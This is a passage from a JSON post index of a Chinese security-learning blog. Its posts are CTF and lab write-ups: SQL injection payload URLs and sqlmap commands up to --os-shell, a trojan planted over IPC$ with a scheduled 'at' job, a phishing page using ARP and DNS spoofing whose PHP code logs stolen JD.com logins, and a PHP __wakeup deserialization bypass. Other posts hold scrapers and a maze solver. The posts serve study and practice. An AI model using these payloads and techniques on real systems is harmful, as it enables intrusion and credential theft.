--+ database:web1002-1 爆表名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+flag1,hint 爆字段名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos; --+flag1,address获取内容 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+usOwycTju+FTUUzXosjr 提交发现不对 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+获取address中的内容 ./Once_More.php下一关地址得到另外一个地址 http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23给出提示XPATH syntax error: ‘class,flag2‘ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23Unknown column ‘flag2’ in ‘where clause’ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23XPATH syntax error: ‘flag{Bugku-sql_6s-2i-4t-bug}‘ ！！！注意把flag改为小写字母 宽字节注入靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 一、手工注入第一步 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27加单引号报错 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,table_name from information_schema.tables where table_schema=database()%23查看所有的表 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23查看表中的列 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23 ctf,ctf2,ctf3,ctf4,gbksqli,news0x637466 为十六进制ctf 获取字段内容 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(pw) from ctf %23flag:nctf{h4cked_By_w00dPeck3r} 二、sqlmap注入检测是否有注入点 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27没有成功使用十六进制 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex获取数据库名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --dbs //选择十六进制 获取数据库名 单引号使用url编码获取表名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --D sae-chinalover --tables获取flag sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex -D sae-chinalover -T ctf --dump","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"木马","date":"2020-07-18T12:34:10.000Z","path":"2020/07/18/木马/","text":"初识木马 实验目的使用灰鸽子软件以及端口爆破软件控制目的主机 准备一台xp，一台2003其中xp地址为10.1.1.3/24 2003为10.1.1.1/24使两个主机能够通信xp作为攻击方，2003为受害者 1.制作木马使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用） 2.扫描主机，并对账号密码进行爆破ip起始地址为10.1.1.1-10.1.1.255密码配置文件其实只要扫描10.1.1.1即可（因为是实验） 获取账号密码username：administratorpassword: “” 3.与目标主机建立IPC$net use \\\\10.1.1.1\\ipc$ &quot;&quot; \\user:administrator 4.植入木马到目标主机copy C:\\Documents and Settings\\shimisi\\桌面\\qq.exe \\\\10.1.1.1\\ipc$ 5.设置目标主机运行木马net time \\\\10.1.1.1根据目标主机时间设置事物的开始时间at \\\\10.1.1.1 17:17 c:\\qq.exe在上面的时间之后三分钟左右设置一个事物即在17：17时运行木马文件 6.成功控制目标主机观察目标主机已自动上线，已可以进行监控或传输数据等操作 获取屏幕内容 控制命令行","tags":[]},{"title":"sqlmap","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/sql注入/","text":"sqlmap使用 第一步: -u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测第二步: -u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取第三步: -u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举第四步: -u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举第五步: -u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump //探测user表name和password字段如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字典进行爆破。 第六步: -u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言sql注入order by * group by * 利用内置函数暴数据库信息 version() 查看数据库版本 database() 查看当前数据库名 user() 查看当前用户 查看表： Select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() 可十六进制查看字段： select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"jdtest","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/jdtest/","text":"爬取京东商品图片的小测试 访问的页面图片链接的位置 # -*- coding = utf - 8 -*- #@Time : 2020/7/16 14:54 #@Author : sunzy #@File : jd.py import re import requests import time import os dir = \"jdtp\" if not os.path.exists(dir): os.mkdir(dir) baseurl = \"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu\" head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125; response = requests.get(url=baseurl, headers = head) #print(response.text) html = response.text findlinks = '&lt;img width=\"220\" height=\"220\" data-img=\"\\d\" src=\"(.*?)\".*?&gt;' #&lt;img width=\"220\" height=\"220\" data-img=\"1\" src=\"//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg\" data-lazy-img=\"done\" source-data-lazy-img=\"\"&gt; urls = re.findall(findlinks, html) for url in urls: time.sleep(1) file_name = url.split('/')[-1] res = requests.get(\"http:\"+url,headers = head) with open(dir+'/'+file_name, \"wb\") as f: f.write(res.content)","tags":[{"name":"python","slug":"python","permalink":"https://sunzhengyu99.github.io/tags/python/"}]},{"title":"爬图","date":"2020-07-18T09:40:51.000Z","path":"2020/07/18/爬图/","text":"用爬虫爬取小姐姐的图片 用的库 re #正则表达式 requests #url请求 time #时间 os #用于创建文件夹，保存图片 ##准备工作1.首先访问该链接https://www.vmgirls.com/2.随便点击一个进入查看详情https://www.vmgirls.com/13344.html3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式该正则表达式为findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39; 完整程序# -*- coding = utf - 8 -*- #@Time : 2020/7/16 13:36 #@Author : sunzy #@File : tupian.py import re import requests import time import os dir = \"plmm\" #文件夹名字 if not os.path.exists(dir): #首先判断是否存在当前文件夹如果没有则创建一个 os.mkdir(dir) # 模仿浏览器的首部信息，绕过一些网站的反爬取措施 head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125; url = \"https://www.vmgirls.com/13344.html\" response = requests.get(url, headers = head) # 访问目标网页，获取网页内容 html = response.text findlinks = '&lt;a href=\"(.*?)\" alt=\".*?\" title=\".*?\"&gt;' urls = re.findall(findlinks, html) #爬取到的图片链接保存在urls中， 是一个列表 for url in urls: time.sleep(1) #防止访问速度过快使服务器崩溃 file_name = url.split('/')[-1] #保存图片的名字 res = requests.get(url, headers = head) #依此访问图片链接 with open(dir+'/'+file_name, \"wb\") as f: #以二进制形式保存图片 f.write(res.content)","tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"diaoyu","date":"2020-07-18T09:37:15.000Z","path":"2020/07/18/diaoyu/","text":"DNS欺骗、ARP攻击及钓鱼网站制作 1.实验目的获取登录jd网页的用户名和密码2.实验主机一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者3.实验材料京东登录网页及其所有图片（浏览器访问https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F 之后保存网页即可）修改index.html中的内容error.php中的内容如下关键代码（用于保存用户名和密码以及迷惑用户） &lt;?php $nam = stripslashes($_POST['name']); //name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要 $pas = stripslashes($_POST['pass']);//pass也一样 $content = \"您已捕获京东账号及密码1个：\" . \" 用户名 \" . $nam . \" 密码 \" . $pas; //保存捕获的用户名和密码 $filed = @fopen(\"1.txt\", \"a+\"); //打开1.txt @fwrite($filed, \"$content\\n\"); //将用户名和密码写入1.txt ?&gt; &lt;html&gt; &lt;head&gt; &lt;script type=\"text/javascript\"&gt; function goBack() &#123; window.history.back() //后退+刷新 &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload=\"goBack()\"&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt; &lt;/body&gt; &lt;/html&gt; 4.实验拓扑图 实验步骤一.部署京东的服务器1.安装DNS和web服务器（具体步骤略）2.配置DNS服务器a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）b.在jd域中新建一台主机 www.jd.com ip:10.1.1.1 2.IISa.将默认网站停止b.新建网站jd.com,文件路径为保存的jd网页c.打开web服务中的asp（因为此网站不是静态网站）（使用2003客户机访问www.jd.com看看网站发布是否成功） 二.部署kali1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。2.开启apache服务，并检查80端口是否已开启systemctl start apache2netstat -antpl3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，添加一条 PTR 记录，使用户访问www.jd.com，指向为10.1.1.2 选中一行后，按两次d可删除内容想要编辑时，先按i(insert)编辑结束后 :wq 保存4.打开ettercap软件5.选择sniff–unified sniffing，并选择监听eth06.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机7.添加欺骗记录选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 28.在Mitm选择ARP欺骗在弹出的窗口中，勾选第一个点击确定9.选择plugins – Manage the plugins，准备进行DNS欺骗在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗 三.用户访问登录页面1.在客户机中在中，再次登录www.jd.com输入用户名密码等，如图，然后点击登录2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)","tags":[{"name":"DNS","slug":"DNS","permalink":"https://sunzhengyu99.github.io/tags/DNS/"}]},{"title":"guestbook","date":"2020-04-18T09:42:34.000Z","path":"2020/04/18/Guestbook/","text":"guestbook 题目提示：This guestbook sucks. sqlmap is your friend. 是sql注入点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息 在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点union 注入!查看列 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,3,4%20# //id=-1 是让前面的内容不显示 3被回显 1.查看数据库名 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,database(),4%20# 数据库的名字g8 2.查看表名 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4# 发现有一个表 flag 3.测试表的字段 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name='flag' limit 1,1),4# 仍然显示flag 4.读取flag https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4# 得到flag!","tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://sunzhengyu99.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"反序列化","date":"2020-03-28T09:42:34.000Z","path":"2020/03/28/php反序列化/","text":"反序列化 PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 而wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。 serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。 unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。 举例说明 &lt;?php class Student{ public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } } $s = new Student(); var_dump(serialize($s)); ?&gt; O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}各个符号的含义变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容} 其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。 当我们将上述的序列化的字符串中的对象属性个数修改为5，变为O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}} 最后执行运行的代码如下: &lt;?php class Student&#123; public $full_name = 'zhangsan'; public $score = 150; public $grades = array(); function __wakeup() &#123; echo \"__wakeup is invoked\"; &#125; function __destruct() &#123; var_dump($this); &#125; &#125; $s = new Student(); $stu = unserialize('O:7:\"Student\":5:&#123;s:9:\"full_name\";s:8:\"zhangsan\";s:5:\"score\";i:150;s:6:\"grades\";a:0:&#123;&#125;&#125;'); ?&gt; 举例说明题目 class xctf&#123; public $flag = '111'; public function __wakeup()&#123; exit('bad requests'); &#125; ?code= &lt;?php class xctf&#123; //定义一个名为xctf的类 public $flag = '111';//定义一个公有的类属性$flag，值为111 public function __wakeup()&#123; //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本 exit('bad requests'); &#125; &#125; $test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为test echo(serialize($test)); //输出被序列化的对象（test） ?&gt; 输出结果 O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示： O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"}]},{"title":"迷宫问题","date":"2020-03-20T10:07:12.000Z","path":"2020/03/20/迷宫问题/","text":"迷宫问题 原题题目描述 小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。 小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。 字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过 输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---##样例输出9解决代码#include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,intP; //坐标 int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向 int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标 int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;Pqu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!='#'&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main() &#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]=='S') //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]=='E') //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125;","tags":[{"name":"bfs","slug":"bfs","permalink":"https://sunzhengyu99.github.io/tags/bfs/"}]}]